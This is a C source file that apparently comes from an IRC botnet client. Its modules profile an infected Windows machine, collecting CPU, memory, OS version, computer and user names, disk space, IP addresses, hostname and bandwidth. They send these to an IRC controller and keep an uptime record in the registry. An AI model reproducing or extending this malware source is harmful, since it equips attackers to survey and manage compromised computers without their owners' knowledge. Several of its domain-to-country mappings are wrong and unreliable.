#include "includes.h"
#include "functions.h"

extern char netinfo_title[];
extern char sysinfo_title[];

char *Uptime(DWORD TickCount,DWORD Startup, BOOL vDays/*=FALSE*/)
{
	static char buffer[50];
	ZeroMemory(buffer,sizeof(buffer));

	DWORD dwTotal=(TickCount/1000)-(Startup/1000);
	DWORD dwDays=dwTotal/86400;
	DWORD dwHours=(dwTotal%86400)/3600;
	DWORD dwMins=((dwTotal%86400)%3600)/60;
	
	if (vDays || dwDays > 0)
		sprintf(buffer,"%d day%s %0.2d:%0.2d",dwDays,(dwDays==1?"":"s"),dwHours,dwMins);
	else
		sprintf(buffer,"%0.2d:%0.2d",dwHours,dwMins);

	return buffer;
}

#ifndef NO_RECORD_UPTIME
BOOL bRecUpdated;

char *RecordUptime(void)
{
	static char buffer[50];
	ZeroMemory(buffer,sizeof(buffer));

	DWORD dwTotal=GetRecord()/1000;
	if (dwTotal==0) {
		sprintf(buffer,"Error <%d>.",GetLastError());
		return buffer;
	}
	DWORD dwDays=dwTotal/86400;
	DWORD dwHours=(dwTotal%86400)/3600;
	DWORD dwMins=((dwTotal%86400)%3600)/60;

	sprintf(buffer,"%d day%s %0.2d:%0.2d",dwDays,(dwDays==1?"":"s"),dwHours,dwMins);
	return buffer;
}


BOOL UpdateRecord(void)
{
	BOOL bSuccess=FALSE;
	DWORD CurRecord;
	DWORD dwGTC=GetTickCount();
	if (!bRecUpdated)
	{	// If it hasnt been updated its worth checking again.
		CurRecord=RegQuery(rupkey.hkey,rupkey.subkey,rupkey.name,bSuccess);

		if (bSuccess)
		{
			if (dwGTC > CurRecord)
				if (RegWrite(rupkey.hkey,rupkey.subkey,rupkey.name,dwGTC))
					return TRUE;
		}
		else
		{
			if (RegWrite(rupkey.hkey,rupkey.subkey,rupkey.name,dwGTC))
				return TRUE;
		}
	}
	else
	{	// If its already been updated then it will keep updating so we can skip the query.
		RegWrite(rupkey.hkey,rupkey.subkey,rupkey.name,dwGTC);
		return TRUE;
	}
	return FALSE;
}

DWORD GetRecord(void)
{
	BOOL bSuccess=FALSE;
	DWORD CurRecord;
	CurRecord=RegQuery(rupkey.hkey,rupkey.subkey,rupkey.name,bSuccess);

	if (bSuccess)
		return CurRecord;
	else
		return 0;

	return 0;
}

DWORD WINAPI RecordUptimeThread(LPVOID param)
{
	bRecUpdated=FALSE;
	if (!noadvapi32) {
		while (1) {
			bRecUpdated=UpdateRecord();
			Sleep(RUPTIME_DELAY);
		}
	}
	ExitThread(0);
}
#endif //NO_RECORD_UPTIME




#ifndef NO_SYSINFO

// asm for cpuspeed() (used for counting cpu cycles)
#pragma warning( disable : 4035 )
inline unsigned __int64 GetCycleCount(void)
{
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
}
#pragma warning( default : 4035 )

// cpu speed function
unsigned __int64 GetCPUSpeed(void)
{
	unsigned __int64 startcycle, speed, num, num2;

	do {
		startcycle = GetCycleCount();
		Sleep(1000);
		speed = ((GetCycleCount()-startcycle)/1000000);
	} while (speed > 1000000);

	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return (speed);
}

// function used for sysinfo
void sysinfo(char *target, void* conn)
{
	IRC* irc=(IRC*)conn;
	char *os="???", os2[140];
	char sinfo[IRCLINE];
	OSVERSIONINFO verinfo;
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2) os = "2003";
	

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s (%s)", os, verinfo.szCSDVersion);
		os = os2;
	}

	DWORD dwcu=256;
	DWORD dwcb=256;
	char CurrentUser[256];
	char CurrentBox[256];
	fGetUserName(CurrentUser,&dwcu);
	fGetComputerName(CurrentBox,&dwcb);

	char sysdir[MAX_PATH];
    GetSystemDirectory(sysdir,sizeof(sysdir));

    char date[70], time[70];
    GetDateFormat(0x409,0,0,"dd:MMM:yyyy",date,70);
    GetTimeFormat(0x409,0,0,"HH:mm:ss",time,70);

	MEMORYSTATUS memstat;
	ZeroMemory(&memstat,sizeof(memstat));
	GlobalMemoryStatus(&memstat); // load memory info into memstat

//	char drive[10];
//	_splitpath(sysdir, drive, NULL, NULL, NULL);
//
	char mtotal[50],mavail[50];
	sprintf(mtotal,commaI64(memstat.dwTotalPhys/1024));
	sprintf(mavail,commaI64(memstat.dwAvailPhys/1024));

	__int64 tmpAvail=0;
	__int64 tmpFree=0;
	__int64 tmpTotal=0;
	
	DWORD dwSize = GetLogicalDriveStrings(0, NULL);
	LPSTR pszDrives = (LPSTR)malloc(dwSize + 2);
	GetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);
	LPCTSTR pszDrv = pszDrives;
	while (*pszDrv) {
		if (strcmp(pszDrv,"A:\\") != 0) {
			DKSPT dkspt;
			dkspt=DiskSpaceTotal(pszDrv, 1073741824);
			tmpAvail+=dkspt.AvailableT;
			tmpFree+=dkspt.FreeT;
			tmpTotal+=dkspt.TotalT;
		}
		pszDrv += _tcslen (pszDrv) + 1;
	}
	free(pszDrives);

	_snprintf(sinfo, IRCLINE, "%s [CPU]: %I64uMHz. [RAM]: %sKB total, %sKB free. [OS]: Windows %s (%d.%d - %d). [Sysdir]: %s. [Computer Name]: %s. [Current User]: %s. [Date]: %s. [Time]: %s. [Uptime]: %s. [Free Space]: %I64uGB/%I64uGB.",
		sysinfo_title, GetCPUSpeed(), mtotal, mavail, replacestr(os,"Service Pack ","SP"), 
		verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, sysdir, CurrentBox, CurrentUser, date, time, Uptime(GetTickCount(),0,TRUE), tmpFree, tmpTotal);

	irc->privmsg(target,sinfo);
	return;
}
#endif

#ifndef NO_NETINFO
DWORD band(BOOL bdownload)
{
	DWORD rval=0;
	
	//DWORD download2=0,band=0;
	char *buffer=NULL;
	
	DWORD count;//number of table entries

	ULONG buf_size=0;
	MIB_IFROW *ifr;
	MIB_IFTABLE *ift;
	DWORD ii=0;
	
	if (fGetIfTable((PMIB_IFTABLE)buffer, &buf_size, TRUE) != ERROR_INSUFFICIENT_BUFFER)
		return 0;

	buffer=(char *)malloc(buf_size);
	if (buffer==NULL)
		return 0;
	ZeroMemory(buffer,buf_size);
	
	if (fGetIfTable((PMIB_IFTABLE)buffer, &buf_size, TRUE) != NO_ERROR)
		return 0;

	ift=(MIB_IFTABLE *)buffer;
	count=ift->dwNumEntries;
	for (ii=0; ii<count; ii++)
	{
		ifr = (ift->table) + ii;
		if(ifr->dwInUcastPkts > 0 && ifr->dwOutUcastPkts > 0)
		{
			if(ifr->dwInUcastPkts == ifr->dwOutUcastPkts)
			{
				ii=ii;
			}
			else
			{
				if (bdownload)
					rval=(DWORD)ifr->dwInOctets;
				else
					rval=(DWORD)ifr->dwOutOctets;
				free(buffer);
				return rval;
			}
		}
	}
	free(buffer);
	return rval;
}

#ifndef NO_SPEEDTEST
extern float dtotal;
extern float utotal;
extern int dx;
extern int ux;
#endif

void netinfo(char *target, void* conn,BOOL mb, BOOL gb)
{
	IRC* irc=(IRC*)conn;
	DWORD n;
	char ctype[8], cname[128];
	static char country[128];
	char ninfo[IRCLINE];
	char tninfo[IRCLINE];

//	if (country[0] == '\0') sprintf(country, checkhost(host));	// country
	
	// get connection type/name
	ZeroMemory(cname,sizeof(cname));
	if (!nowininet) {
		if (!fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0))
			sprintf(cname, "Not connected");
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) 
			sprintf(ctype, "Dial-up");
	 	else 
			sprintf(ctype,  "LAN");
	} else {
		sprintf(ctype, "N/A");
		sprintf(cname, "N/A");
	}
	
	DWORD bandw=0,upbandw=0;
	char downloaded[50],uploaded[50];
	if (!noiphlpapi)
	{
		bandw=band(TRUE);
		upbandw=band(FALSE);
	}
	if (mb)
	{
		sprintf(downloaded,"%sMB",commaI64(bandw/1048576));
		sprintf(uploaded,"%sMB",commaI64(upbandw/1048576));
	}
	else if (gb)
	{
		sprintf(downloaded,"%sGB",commaI64(bandw/1073741824));
		sprintf(uploaded,"%sGB",commaI64(upbandw/1073741824));
	}
	else
	{
		sprintf(downloaded,"%sKB",commaI64(bandw/1024));
		sprintf(uploaded,"%sKB",commaI64(upbandw/1024));
	}

	_snprintf(ninfo, IRCLINE,
		"%s [Connection Type]: %s (%s). [Internal IP]: %s. [External IP]: %s. [Hostname]: %s. [Private]: %s.",
		netinfo_title, ctype, cname, inip, exip, host, (PrivateIP(inip)?("Yes"):("No")));

#ifndef NO_CHECKHOST
	sprintf(tninfo,"[Country]: %s.",checkhost(host));
	strncat(ninfo,tninfo,sizeof(ninfo));
#endif // NO_CHECKHOST

#ifndef NO_SPEEDTEST
	sprintf(tninfo,"[Speedtest]: Upload: %.2f KB/s, Download: %.2f KB/s.",(utotal>0?utotal/ux:0),(dtotal>0?dtotal/dx:0));
	strncat(ninfo,tninfo,sizeof(ninfo));
#endif // NO_SPEEDTEST

#ifndef NO_BWDISP
	sprintf(tninfo,"[Bandwidth]: Downloaded: %s, Uploaded: %s.",downloaded,uploaded);
	strncat(ninfo,tninfo,sizeof(ninfo));
#endif // NO_BWDISP
	
	irc->privmsg(target,ninfo);
	return;
}



#ifndef NO_CHECKHOST
char *checkhost(char *thost)
{
    char gethost[MAX_HOSTNAME];
	strcpy(gethost,thost);
    char *country;
	char *pHLD = strrchr(gethost, '.');

	if (pHLD) {
		if(strstr(pHLD, ".gov") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".net") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".org") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".com") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".mil") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".edu") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".uk") != NULL)
			country = "United Kingdom";    
		else if(strstr(pHLD, ".ac") != NULL)    
			country = "China";
		else if(strstr(pHLD, ".ar") != NULL)    
			country = "Uruguay";
		else if(strstr(pHLD, ".at") != NULL)
			country = "Austria";
		else if(strstr(pHLD, ".au") != NULL)
			country = "Australia";
		else if(strstr(pHLD, ".be") != NULL)
			country = "Belgium";
		else if(strstr(pHLD, ".bg") != NULL)
			country = "Bulgaria";
		else if(strstr(pHLD, ".br") != NULL)
			country = "Brazil";
		else if(strstr(pHLD, ".by") != NULL)
			country = "Belarus";
		else if(strstr(pHLD, ".ca") != NULL)
			country = "Canada";
		else if(strstr(pHLD, ".cc") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".ch") != NULL)
			country = "Switzerland";
		else if(strstr(pHLD, ".cl") != NULL)
			country = "Chile";
		else if(strstr(pHLD, ".cn") != NULL)
			country = "China";
		else if(strstr(pHLD, ".cr") != NULL)
			country = "Uruguay";
		else if(strstr(pHLD, ".cx") != NULL)
			country = "Poland";
		else if(strstr(pHLD, ".cz") != NULL)
			country = "Czech Republic";
		else if(strstr(pHLD, ".de") != NULL)
			country = "Germany";
		else if(strstr(pHLD, ".dk") != NULL)
			country = "Denmark";
		else if(strstr(pHLD, ".ee") != NULL)
			country = "Estonia";
		else if(strstr(pHLD, ".es") != NULL)
			country = "Spain";
		else if(strstr(pHLD, ".fi") != NULL)
			country = "Finland";
		else if(strstr(pHLD, ".fj") != NULL)
			country = "Figi";
		else if(strstr(pHLD, ".fr") != NULL)
			country = "France";
		else if(strstr(pHLD, ".ge") != NULL)
			country = "Georgia";
		else if(strstr(pHLD, ".gr") != NULL)
			country = "Greece";
		else if(strstr(pHLD, ".hk") != NULL)
			country = "Hong Kong";
		else if(strstr(pHLD, ".hu") != NULL)
			country = "Hungary";
		else if(strstr(pHLD, ".id") != NULL)
			country = "Indonesia";
		else if(strstr(pHLD, ".ie") != NULL)
			country = "Ireland";
		else if(strstr(pHLD, ".in") != NULL)
			country = "India";
		else if(strstr(pHLD, ".is") != NULL)
			country = "Iceland";
		else if(strstr(pHLD, ".it") != NULL)
			country = "Italy";
		else if(strstr(pHLD, ".jp") != NULL)
			country = "Japan";
		else if(strstr(pHLD, ".kg") != NULL)
			country = "Kyrgyzstan";
		else if(strstr(pHLD, ".kr") != NULL)
			country = "Korea";
		else if(strstr(pHLD, ".kz") != NULL)
			country = "Kazakhstan";
		else if(strstr(pHLD, ".lt") != NULL)
			country = "Lithuania";
		else if(strstr(pHLD, ".lv") != NULL)
			country = "Latvia";
		else if(strstr(pHLD, ".nl") != NULL)
			country = "Netherlands";
		else if(strstr(pHLD, ".no") != NULL)
			country = "Norway";
		else if(strstr(pHLD, ".nu") != NULL)
			country = "Japan";
		else if(strstr(pHLD, ".nz") != NULL)
			country = "New Zealand";
		else if(strstr(pHLD, ".pl") != NULL)
			country = "Poland";
		else if(strstr(pHLD, ".pt") != NULL)
			country = "Portugal";
		else if(strstr(pHLD, ".ro") != NULL)
			country = "Romania";
		else if(strstr(pHLD, ".ru") != NULL)
			country = "Russia";
		else if(strstr(pHLD, ".sa") != NULL)
			country = "Saudi Arabia";
		else if(strstr(pHLD, ".se") != NULL)
			country = "Sweden";
		else if(strstr(pHLD, ".sg") != NULL)
			country = "Singapore";
		else if(strstr(pHLD, ".si") != NULL)
			country = "Slovenia";
		else if(strstr(pHLD, ".sk") != NULL)
			country = "Slovakia";
		else if(strstr(pHLD, ".su") != NULL)
			country = "Russia";
		else if(strstr(pHLD, ".th") != NULL)
			country = "Thailand";
		else if(strstr(pHLD, ".tr") != NULL)
			country = "Turkey";
		else if(strstr(pHLD, ".tw") != NULL)
			country = "Taiwan";
		else if(strstr(pHLD, ".ua") != NULL)
			country = "Ukraine";
		else if(strstr(pHLD, ".us") != NULL)
			country = "United States";
		else if(strstr(pHLD, ".za") != NULL)
			country = "South Africa";
		else
			country = "Unknown";
	} else
		country = "Unknown";

    return country;
}
#endif // NO_CHECKHOST
#endif // NO_NETINFO